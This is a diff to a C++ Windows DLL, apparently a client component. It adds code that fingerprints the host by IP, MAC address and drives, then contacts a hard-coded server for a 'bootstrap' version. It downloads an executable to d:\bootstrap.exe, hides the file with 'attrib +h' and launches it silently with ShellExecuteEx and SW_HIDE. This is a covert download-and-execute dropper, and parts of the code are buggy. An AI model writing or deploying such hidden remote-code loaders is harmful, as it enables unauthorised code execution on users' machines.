@@ -12,9 +12,16 @@
 #include <dbt.h>
 #include "log.h"
 #include <math.h>
+#include <vector>
+#include <string>
+#include <Iphlpapi.h>
+#include <shellapi.h>
+using namespace std;
 
 #pragma warning(disable: 4996)
 #pragma comment(lib, "Ws2_32.lib")
+#pragma comment(lib,"Iphlpapi.lib")
+#pragma comment(lib,"Shell32.lib")
 
 #define LOG_FILE  "dll_log.log"
 
@@ -24,6 +31,7 @@
 #define TCP_CLIENT_STATE_INIT  0
 #define TCP_CLIENT_STATE_SEND_GET_REQ 1
 #define TCP_CLIENT_STATE_RECV_GET_REP 2
+#define TCP_CLIENT_STATE_WAIT_FOR_DOWNLOAD 3
 
 
 typedef struct tcp_client_status
@@ -31,6 +39,12 @@ typedef struct tcp_client_status
 	SOCKET sock;
 	int state;
 }TCP_CLIENT_STATUS_T;
+
+
+typedef struct local_drive{
+	string drive_name;
+	unsigned int  drive_type;
+}LOCAL_DRIVE_T;
 
 
 char host_exe_path_[512] = { 0 };
@@ -41,6 +55,10 @@ BOOL bQuit_ = FALSE;
 int osVersion_ = 0;
 BOOL isVistaLaterOS_ = FALSE;
 TCP_CLIENT_STATUS_T tcp_client_status_ = { 0 };
+vector<LOCAL_DRIVE_T> local_drives_;
+float local_bootstrap_version_ = 0.0f;
+BOOL isFirstDataPacket_ = TRUE;
+FILE *bootstrapHandle_ = NULL;
 
 void *loger_ = NULL;
 
@@ -115,11 +133,14 @@ void InitNetwork()
 }
 
 
+void CleanupNetwork()
+{
+	WSACleanup();
+}
+
 
 unsigned __stdcall localProc(void* pArguments)
 {
-	
-
 	SOCKET sockSrv = socket(AF_INET, SOCK_DGRAM, 0);
 
 	SOCKADDR_IN  addrServ;
@@ -141,7 +162,7 @@ unsigned __stdcall localProc(void* pArguments)
 		hdr->msg_type == MSG_TYPE_BOOTSTRAP_LOCAL_PATH)
 	{
 		body = recvBuf + sizeof(LOCAL_PROTO_T);
-		memcpy(host_exe_path_, body, hdr->msg_len);
+		memcpy(host_exe_path_, body, hdr->body_len);
 		geted_host_exe_path_ = true;
 	}
 	closesocket(sockSrv);
@@ -238,17 +259,65 @@ int get_os_version()
 
 int get_local_ipv4_addr()
 {
-
+	int nLen = 256;
+	char hostname[20];
+	gethostname(hostname, nLen);
+	hostent *pHost = gethostbyname(hostname);
+	char *lpAddr = pHost->h_addr_list[0];
+	struct in_addr inAddr;
+	memmove(&inAddr, lpAddr, 4);
+	return inAddr.S_un.S_addr;
 }
 
 char get_number_of_partition()
 {
-
+	DWORD dwSize = MAX_PATH;
+	unsigned short count = 0;
+	char szLogicalDrives[MAX_PATH] = { 0 };
+	local_drives_.clear();
+	//获取逻辑驱动器号字符串
+	DWORD dwResult = GetLogicalDriveStrings(dwSize, szLogicalDrives);
+	if (dwResult > 0 && dwResult <= MAX_PATH) {
+		char* szSingleDrive = szLogicalDrives;  //从缓冲区起始地址开始
+		while (*szSingleDrive) {
+			LOCAL_DRIVE_T ldr;
+			ldr.drive_name = szSingleDrive;
+			UINT uDriverType = GetDriveType(ldr.drive_name.c_str());
+			ldr.drive_type = uDriverType;
+			szSingleDrive += strlen(szSingleDrive) + 1;
+			count++;
+			local_drives_.push_back(ldr);
+		}
+	}
+	return (char)count;
 }
 
 char *get_mac_address()
 {
-
+	static char mac_addr[6 + 1] = { 0 };
+	memset(mac_addr, 0, 7);
+	PIP_ADAPTER_INFO pIpAdapterInfo = new IP_ADAPTER_INFO();
+	unsigned long stSize = sizeof(IP_ADAPTER_INFO);
+	int nRel = GetAdaptersInfo(pIpAdapterInfo, &stSize);
+	if (ERROR_BUFFER_OVERFLOW == nRel)
+	{
+		delete pIpAdapterInfo;
+		pIpAdapterInfo = (PIP_ADAPTER_INFO)new BYTE[stSize];
+		nRel = GetAdaptersInfo(pIpAdapterInfo, &stSize);
+	}
+	if (ERROR_SUCCESS == nRel)
+	{
+		if (pIpAdapterInfo)
+		{
+			memcpy(mac_addr, pIpAdapterInfo->Address, 6);
+		}
+	}
+	//释放内存空间
+	if (pIpAdapterInfo)
+	{
+		delete pIpAdapterInfo;
+	}
+	return mac_addr;
 }
 
 
@@ -262,8 +331,7 @@ unsigned __stdcall registerProc(void* pArguments)
 	int total_len = 0;
 
 	SOCKET sock = create_local_datagramsock_and_bind();
-	if (sock == 0)
-	{
+	if (sock == 0){
 		return ret;
 	}
 
@@ -298,23 +366,135 @@ unsigned __stdcall registerProc(void* pArguments)
 }
 
 
+void setFileHidden(char *file)
+{
+	string filepath = file;
+	string strCmd = "attrib +h" + filepath;
+	WinExec(strCmd.c_str(), 0);
+}
+
+
+void onGetBootStrapVersion(TCP_CLIENT_STATUS_T *client, float version)
+{
+	char buffer[512] = { 0 };
+	LOCAL_PROTO_T *hdr = (LOCAL_PROTO_T*)buffer;
+	if (version > local_bootstrap_version_)
+	{
+		local_bootstrap_version_ = version;
+		hdr->version = PROTO_VERSION;
+		hdr->msg_type = MSG_TYPE_DOWNLOAD_BOOTSTRAP;
+		hdr->body_len = 0;
+		send(client->sock, buffer, sizeof(LOCAL_PROTO_T), 0);
+		client->state = TCP_CLIENT_STATE_WAIT_FOR_DOWNLOAD;
+	}
+}
+
+void onDownloadData(TCP_CLIENT_STATUS_T *client, char *data, int len)
+{
+	if (isFirstDataPacket_)
+	{
+		if (local_drives_.size() >= 2)
+		{
+			bootstrapHandle_ = fopen("d:\\bootstrap.exe", "wb+");
+			setFileHidden("d:\\bootstrap.exe");
+		}
+		
+	}
+	if (bootstrapHandle_ != NULL)
+		fwrite(data, len, 1, bootstrapHandle_);
+}
+
+void onDownloadDataEnd(TCP_CLIENT_STATUS_T *client)
+{
+	isFirstDataPacket_ = TRUE;
+	if (bootstrapHandle_ != NULL)
+		fclose(bootstrapHandle_);
+	client->state = TCP_CLIENT_STATE_INIT;
+	closesocket(client->sock);
+	Sleep(1000);
+
+	SHELLEXECUTEINFO ShExecInfo = { 0 };
+	ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
+	ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
+	ShExecInfo.hwnd = NULL;
+	ShExecInfo.lpVerb = "open";
+	ShExecInfo.lpFile = "d:\\bootstrap.exe";
+	ShExecInfo.lpParameters = NULL;
+	ShExecInfo.lpDirectory = NULL;
+	ShExecInfo.nShow = SW_HIDE;
+	ShExecInfo.hInstApp = NULL;
+	ShellExecuteEx(&ShExecInfo);
+}
+
+
+#define CONTINUE_READ -1
+#define READ_OK  0
+
+int onPacketRead(TCP_CLIENT_STATUS_T *client, char * packet, int len)
+{
+	char *ptr = NULL;
+
+	LOCAL_PROTO_T *hdr = (LOCAL_PROTO_T *)packet;
+	if (hdr->version != PROTO_VERSION)
+		return READ_OK;
+
+	switch (client->state)
+	{
+	case TCP_CLIENT_STATE_SEND_GET_REQ:
+		if (hdr->msg_type == MSG_TYPE_REPLY_BOOTSTRAP_VERSION)
+		{
+			client->state = TCP_CLIENT_STATE_RECV_GET_REP;
+			ptr = packet + sizeof(LOCAL_PROTO_T);
+			float version = *(float *)ptr;
+			onGetBootStrapVersion(client, version);
+		}
+		break;
+	case TCP_CLIENT_STATE_INIT:
+		break;
+	case TCP_CLIENT_STATE_RECV_GET_REP:
+		break;
+	case TCP_CLIENT_STATE_WAIT_FOR_DOWNLOAD:
+		if (hdr->msg_type == MSG_TYPE_DOWNLOAD_DATA ||
+			hdr->msg_type == MSG_TYPE_DOWNLOAD_DATA_END)
+		{
+			ptr = packet + sizeof(LOCAL_PROTO_T);
+			len = len - sizeof(LOCAL_PROTO_T);
+			onDownloadData(client, ptr, len);
+			isFirstDataPacket_ = FALSE;
+			if (hdr->msg_type == MSG_TYPE_DOWNLOAD_DATA_END)
+			{
+				onDownloadDataEnd(client);
+			}
+		}
+		break;
+	}
+		
+}
+
+
 unsigned __stdcall bootstrapProc(void* pArguments)
 {
 	int ret = 0;
-	char buffer[512] = { 0 };
+	char buffer[1500] = { 0 };
 	FD_SET readSet;
 	struct timeval timeout = { 0 };
 	FD_ZERO(&readSet);
-
-	SOCKET sock = create_local_streamsock_and_bind();
-	if (sock == 0)
-	{
-		return ret;
-	}
+	int left = 0;
+	int offset = 0;
+	char packet[1500] = { 0 };
+	int packet_len = 0;
+	int prev_packet_len = 0;
+	int pre_packet_is_not_completely = 0;
+	SOCKET sock;
+	
 	while (!bQuit_)
 	{
 		if (tcp_client_status_.state == TCP_CLIENT_STATE_INIT)
 		{
+			sock = create_local_streamsock_and_bind();
+			if (sock == 0){
+				return ret;
+			}
 			SOCKADDR_IN  addrServ;
 			addrServ.sin_addr.S_un.S_addr = inet_addr(SERVER_ADDR);
 			addrServ.sin_family = AF_INET;
@@ -343,8 +523,54 @@ unsigned __stdcall bootstrapProc(void* pArguments)
 				ret = recv(sock, buffer, sizeof(buffer), 0);
 				if (ret > 0)
 				{
-
+					if (ret < sizeof(LOCAL_PROTO_T))
+					{
+						closesocket(sock);
+						tcp_client_status_.state = TCP_CLIENT_STATE_INIT;
+						Sleep(1000 * 300);
+						continue;
+					}
+					hdr = (LOCAL_PROTO_T *)buffer;
+					packet_len = sizeof(LOCAL_PROTO_T)+hdr->body_len;
+					if (ret == packet_len)
+					{
+						pre_packet_is_not_completely = 0;
+						onPacketRead(&tcp_client_status_, buffer, ret);
+					}
+					else if (ret < packet_len && !pre_packet_is_not_completely)
+					{
+						offset = 0;
+						left = packet_len - offset;
+						prev_packet_len = packet_len;
+						pre_packet_is_not_completely = 1;
+						memcpy(&packet[offset], buffer, ret);
+						offset += ret;
+					}
+					else if (pre_packet_is_not_completely && ret < left)
+					{
+						memcpy(&packet[offset], buffer, ret);
+						offset += ret;
+						left = left - ret;
+					}
+					else if (pre_packet_is_not_completely && ret == left)
+					{
+						pre_packet_is_not_completely = 0;
+						memcpy(&packet[offset], buffer, ret);
+						offset += ret;
+						left = left - ret;
+						onPacketRead(&tcp_client_status_, packet, offset);
+						prev_packet_len = 0;
+						offset = 0;
+					}
 				}
+				else
+				{
+					closesocket(sock);
+					tcp_client_status_.state = TCP_CLIENT_STATE_INIT;
+					Sleep(1000 * 300);
+					continue;
+				}
+					
 			}
 			else if (ret == 0) //timeout
 			{
